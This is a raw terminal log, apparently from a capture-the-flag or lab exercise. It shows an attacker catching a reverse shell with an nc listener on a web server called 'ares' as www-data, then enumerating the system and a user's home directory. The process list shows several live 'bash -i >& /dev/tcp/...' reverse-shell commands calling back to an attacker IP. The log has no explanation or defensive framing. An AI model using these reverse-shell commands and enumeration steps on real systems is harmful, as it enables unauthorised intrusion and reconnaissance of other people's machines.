@@ -1,0 +1,267 @@
+❯ nc -lvnp 5550
+Connection from 10.10.175.125:49636
+bash: cannot set terminal process group (633): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ares:/var/www/html/TASK12/uploads$ uname -a
+uname -a
+Linux ares 5.15.0-117-generic #127~20.04.1-Ubuntu SMP Thu Jul 11 15:36:12 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+www-data@ares:/var/www/html/TASK12/uploads$ cat /etc/os-release
+cat /etc/os-release
+NAME="Ubuntu"
+VERSION="20.04.6 LTS (Focal Fossa)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 20.04.6 LTS"
+VERSION_ID="20.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=focal
+UBUNTU_CODENAME=focal
+www-data@ares:/var/www/html/TASK12/uploads$ whoami
+whoami
+www-data
+www-data@ares:/var/www/html/TASK12/uploads$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(MWR{Ares-Compromised})
+www-data@ares:/var/www/html/TASK12/uploads$ groups
+groups
+www-data MWR{Ares-Compromised}
+www-data@ares:/var/www/html/TASK12/uploads$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+www-data@ares:/var/www/html/TASK12/uploads$ env
+env
+LANGUAGE=en_ZA:en
+PWD=/var/www/html/TASK12/uploads
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+INVOCATION_ID=8a3da75b28cf4ea1a3fce91c1680730d
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+APACHE_RUN_GROUP=www-data
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=2
+APACHE_RUN_DIR=/var/run/apache2
+JOURNAL_STREAM=8:25549
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+_=/usr/bin/env
+www-data@ares:/var/www/html/TASK12/uploads$ ps aux
+ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  1.4 168316  6652 ?        Ss   10:38   0:03 /sbin/init splash
+root           2  0.0  0.0      0     0 ?        S    10:38   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   10:38   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   10:38   0:00 [rcu_par_gp]
+root           5  0.0  0.0      0     0 ?        I<   10:38   0:00 [slub_flushwq]
+root           6  0.0  0.0      0     0 ?        I<   10:38   0:00 [netns]
+root           8  0.0  0.0      0     0 ?        I<   10:38   0:00 [kworker/0:0H-events_highpri]
+root          10  0.0  0.0      0     0 ?        I<   10:38   0:00 [mm_percpu_wq]
+root          11  0.0  0.0      0     0 ?        S    10:38   0:00 [rcu_tasks_rude_]
+root          12  0.0  0.0      0     0 ?        S    10:38   0:00 [rcu_tasks_trace]
+root          13  0.0  0.0      0     0 ?        S    10:38   0:00 [ksoftirqd/0]
+root          14  0.0  0.0      0     0 ?        I    10:38   0:00 [rcu_sched]
+root          15  0.0  0.0      0     0 ?        S    10:38   0:00 [migration/0]
+root          16  0.0  0.0      0     0 ?        S    10:38   0:00 [idle_inject/0]
+root          18  0.0  0.0      0     0 ?        S    10:38   0:00 [cpuhp/0]
+root          19  0.0  0.0      0     0 ?        S    10:38   0:00 [kdevtmpfs]
+root          20  0.0  0.0      0     0 ?        I<   10:38   0:00 [inet_frag_wq]
+root          21  0.0  0.0      0     0 ?        S    10:38   0:00 [kauditd]
+root          22  0.0  0.0      0     0 ?        S    10:38   0:00 [khungtaskd]
+root          23  0.0  0.0      0     0 ?        S    10:38   0:00 [oom_reaper]
+root          24  0.0  0.0      0     0 ?        I<   10:38   0:00 [writeback]
+root          25  0.0  0.0      0     0 ?        S    10:38   0:01 [kcompactd0]
+root          26  0.0  0.0      0     0 ?        SN   10:38   0:00 [ksmd]
+root          72  0.0  0.0      0     0 ?        I<   10:38   0:00 [kintegrityd]
+root          73  0.0  0.0      0     0 ?        I<   10:38   0:00 [kblockd]
+root          74  0.0  0.0      0     0 ?        I<   10:38   0:00 [blkcg_punt_bio]
+root          75  0.0  0.0      0     0 ?        S    10:38   0:00 [xen-balloon]
+root          76  0.0  0.0      0     0 ?        I<   10:38   0:00 [tpm_dev_wq]
+root          77  0.0  0.0      0     0 ?        I<   10:38   0:00 [ata_sff]
+root          78  0.0  0.0      0     0 ?        I<   10:38   0:00 [md]
+root          79  0.0  0.0      0     0 ?        I<   10:38   0:00 [edac-poller]
+root          80  0.0  0.0      0     0 ?        I<   10:38   0:00 [devfreq_wq]
+root          81  0.0  0.0      0     0 ?        S    10:38   0:00 [watchdogd]
+root          83  0.0  0.0      0     0 ?        I<   10:38   0:03 [kworker/0:1H-kblockd]
+root          85  0.2  0.0      0     0 ?        S    10:38   0:26 [kswapd0]
+root          86  0.0  0.0      0     0 ?        S    10:38   0:00 [ecryptfs-kthrea]
+root          88  0.0  0.0      0     0 ?        I<   10:38   0:00 [kthrotld]
+root          89  0.0  0.0      0     0 ?        I<   10:38   0:00 [acpi_thermal_pm]
+root          90  0.0  0.0      0     0 ?        S    10:38   0:00 [xenbus]
+root          92  0.0  0.0      0     0 ?        S    10:38   0:00 [xenwatch]
+root          93  0.0  0.0      0     0 ?        S    10:38   0:00 [scsi_eh_0]
+root          94  0.0  0.0      0     0 ?        I<   10:38   0:00 [scsi_tmf_0]
+root          95  0.0  0.0      0     0 ?        S    10:38   0:00 [scsi_eh_1]
+root          96  0.0  0.0      0     0 ?        I<   10:38   0:00 [scsi_tmf_1]
+root          98  0.0  0.0      0     0 ?        I<   10:38   0:00 [vfio-irqfd-clea]
+root          99  0.0  0.0      0     0 ?        I<   10:38   0:00 [mld]
+root         101  0.0  0.0      0     0 ?        I<   10:38   0:00 [ipv6_addrconf]
+root         111  0.0  0.0      0     0 ?        I<   10:38   0:00 [kstrp]
+root         114  0.0  0.0      0     0 ?        I<   10:38   0:00 [zswap-shrink]
+root         115  0.0  0.0      0     0 ?        I<   10:38   0:00 [kworker/u31:0]
+root         120  0.0  0.0      0     0 ?        I<   10:38   0:00 [charger_manager]
+root         176  0.0  0.0      0     0 ?        S    10:38   0:00 [jbd2/xvda5-8]
+root         177  0.0  0.0      0     0 ?        I<   10:38   0:00 [ext4-rsv-conver]
+root         217  0.0  1.7  35928  7972 ?        S<s  10:38   0:03 /lib/systemd/systemd-journald
+root         257  0.0  0.9  25620  4232 ?        Ss   10:38   0:00 /lib/systemd/systemd-udevd
+systemd+     279  0.0  0.6  27272  3116 ?        Ss   10:38   0:00 /lib/systemd/systemd-networkd
+systemd+     293  0.0  0.3 164644  1796 ?        Ssl  10:38   0:00 /lib/systemd/systemd-timesyncd
+systemd+     298  0.0  0.9  24688  4468 ?        Ss   10:38   0:00 /lib/systemd/systemd-resolved
+root         328  0.0  0.0      0     0 ?        I<   10:38   0:00 [cryptd]
+root         396  0.0  0.2 238208   940 ?        Ssl  10:38   0:00 /usr/lib/accountsservice/accounts-daemon
+root         397  0.0  0.0   2548    72 ?        Ss   10:38   0:00 /usr/sbin/acpid
+avahi        400  0.0  0.1   8480   488 ?        Ss   10:38   0:00 avahi-daemon: running [ares.local]
+root         401  0.0  0.2   9424   952 ?        Ss   10:38   0:00 /usr/sbin/cron -f
+message+     403  0.0  0.4   8676  1924 ?        Ss   10:38   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         405  0.0  0.7 261844  3244 ?        Ssl  10:38   0:01 /usr/sbin/NetworkManager --no-daemon
+root         412  0.0  1.8  39688  8612 ?        Ss   10:38   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         415  0.0  0.6 235224  3132 ?        Ssl  10:38   0:01 /usr/lib/policykit-1/polkitd --no-debug
+syslog       417  0.0  0.3 224352  1460 ?        Ssl  10:38   0:01 /usr/sbin/rsyslogd -n -iNONE
+root         418  0.5  2.5 1246116 11876 ?       Ssl  10:38   0:53 /usr/lib/snapd/snapd
+root         419  0.0  0.1 235612   560 ?        Ssl  10:38   0:00 /usr/libexec/switcheroo-control
+root         421  0.0  0.3  17364  1532 ?        Ss   10:38   0:00 /lib/systemd/systemd-logind
+root         430  0.0  0.4 393524  2184 ?        Ssl  10:38   0:00 /usr/lib/udisks2/udisksd
+root         432  0.0  0.1  13696   632 ?        Ss   10:38   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
+avahi        455  0.0  0.0   8348   332 ?        S    10:38   0:00 avahi-daemon: chroot helper
+root         488  0.0  0.3 176368  1572 ?        Ssl  10:38   0:00 /usr/sbin/cups-browsed
+root         496  0.0  0.3 241392  1792 ?        Ssl  10:38   0:00 /usr/sbin/ModemManager
+root         532  0.0  1.7 118040  8132 ?        Ssl  10:38   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+root         556  0.0  1.7 1758644 7912 ?        Ssl  10:38   0:02 /usr/bin/amazon-ssm-agent
+whoopsie     560  0.0  0.3 175388  1608 ?        Ssl  10:38   0:00 /usr/bin/whoopsie -f
+root         562  0.0  0.0      0     0 ?        I    10:38   0:00 [kworker/0:3-cgroup_destroy]
+kernoops     567  0.0  0.1  11272   472 ?        Ss   10:38   0:00 /usr/sbin/kerneloops --test
+kernoops     569  0.0  0.1  11272   472 ?        Ss   10:38   0:00 /usr/sbin/kerneloops
+root         577  0.0  0.2 239492  1108 ?        Ssl  10:38   0:00 /usr/sbin/gdm3
+root         633  0.0  1.5 194792  7120 ?        Ss   10:38   0:00 /usr/sbin/apache2 -k start
+rtkit        661  0.0  0.0 152936   244 ?        SNsl 10:38   0:02 /usr/libexec/rtkit-daemon
+root         755  0.0  0.3  28440  1732 ?        Ss   10:38   0:00 /usr/sbin/cupsd -l
+lp           763  0.0  0.1  15332   800 ?        S    10:38   0:00 /usr/lib/cups/notifier/dbus dbus://
+root         838  0.0  0.2 243812  1052 ?        Ssl  10:38   0:01 /usr/lib/upower/upowerd
+colord      1142  0.0  1.1 246264  5116 ?        Ssl  10:41   0:02 /usr/libexec/colord
+root        1178  0.0  0.0   8208   120 ttyS0    Ss+  10:41   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
+root        1774  0.0  0.0      0     0 ?        I    12:39   0:00 [kworker/u30:0-loop7]
+root        1840  0.0  0.0      0     0 ?        I    12:51   0:00 [kworker/u30:1-events_unbound]
+www-data    1844  0.0  1.6 195472  7464 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1847  0.0  1.6 195472  7604 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1855  0.0  1.5 195464  7012 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1856  0.0  1.6 195464  7540 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1860  0.0  1.5 195464  7348 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1866  0.0  1.4 195432  6844 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1869  0.0  1.6 195464  7604 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1876  0.0  1.6 195432  7568 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+www-data    1883  0.0  1.6 195448  7448 ?        S    12:53   0:00 /usr/sbin/apache2 -k start
+root        1907  0.0  0.0      0     0 ?        I    12:54   0:00 [kworker/0:1-events]
+www-data    1912  0.0  1.5 195392  7260 ?        S    12:54   0:00 /usr/sbin/apache2 -k start
+www-data    1970  0.0  0.0   2616    68 ?        S    13:04   0:00 sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.21.166.215/5550 0>&1'
+www-data    1971  0.0  0.1   3984   604 ?        S    13:04   0:00 /bin/bash -c bash -i >& /dev/tcp/10.21.166.215/5550 0>&1
+www-data    1972  0.0  0.4   4116  2192 ?        S    13:04   0:00 bash -i
+www-data    1974  0.0  0.0   2616    72 ?        S    13:04   0:00 sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.21.166.215/5551 0>&1'
+www-data    1975  0.0  0.1   3984   612 ?        S    13:04   0:00 /bin/bash -c bash -i >& /dev/tcp/10.21.166.215/5551 0>&1
+www-data    1976  0.0  0.2   4116   992 ?        S    13:04   0:00 bash -i
+www-data    1978  0.0  0.0   2616    64 ?        S    13:04   0:00 sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.21.166.215/5552 0>&1'
+www-data    1979  0.0  0.1   3984   708 ?        S    13:04   0:00 /bin/bash -c bash -i >& /dev/tcp/10.21.166.215/5552 0>&1
+www-data    1980  0.0  0.1   4116   808 ?        S    13:04   0:00 bash -i
+www-data    1982  0.0  0.0   2616    68 ?        S    13:04   0:00 sh -c /bin/bash -c 'bash -i >& /dev/tcp/10.21.166.215/5553 0>&1'
+www-data    1983  0.0  0.1   3984   704 ?        S    13:04   0:00 /bin/bash -c bash -i >& /dev/tcp/10.21.166.215/5553 0>&1
+www-data    1984  0.0  0.2   4116  1000 ?        S    13:04   0:00 bash -i
+root        1987  0.0  0.0      0     0 ?        I    13:08   0:00 [kworker/u30:2-events_unbound]
+www-data    2052  0.0  0.6   5900  2780 ?        R    13:10   0:00 ps aux
+www-data@ares:/var/www/html/TASK12/uploads$ netstat -tulnp
+netstat -tulnp
+
+Command 'netstat' not found, but can be installed with:
+
+apt install net-tools
+
+Please ask your administrator.
+www-data@ares:/var/www/html/TASK12/uploads$ ss -tulnp
+ss -tulnp
+Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
+udp   UNCONN 0      0                 0.0.0.0:5353         0.0.0.0:*            
+udp   UNCONN 0      0                 0.0.0.0:51694        0.0.0.0:*            
+udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
+udp   UNCONN 0      0      10.10.175.125%eth0:68           0.0.0.0:*            
+udp   UNCONN 0      0                 0.0.0.0:631          0.0.0.0:*            
+udp   UNCONN 0      0                    [::]:5353            [::]:*            
+udp   UNCONN 0      0                    [::]:37925           [::]:*            
+tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
+tcp   LISTEN 0      5               127.0.0.1:631          0.0.0.0:*            
+tcp   LISTEN 0      511                     *:33333              *:*            
+tcp   LISTEN 0      511                     *:80                 *:*            
+tcp   LISTEN 0      5                   [::1]:631             [::]:*            
+tcp   LISTEN 0      511                     *:8080               *:*            
+www-data@ares:/var/www/html/TASK12/uploads$ ls /
+ls /
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+www-data@ares:/var/www/html/TASK12/uploads$ cd /home/garcher
+cd /home/garcher
+www-data@ares:/home/garcher$ ls
+ls
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+www-data@ares:/home/garcher$ tree
+tree
+.
+|-- Desktop
+|-- Documents
+|-- Downloads
+|-- Music
+|-- Pictures
+|-- Public
+|-- Templates
+`-- Videos
+
+8 directories, 0 files
+www-data@ares:/home/garcher$ 
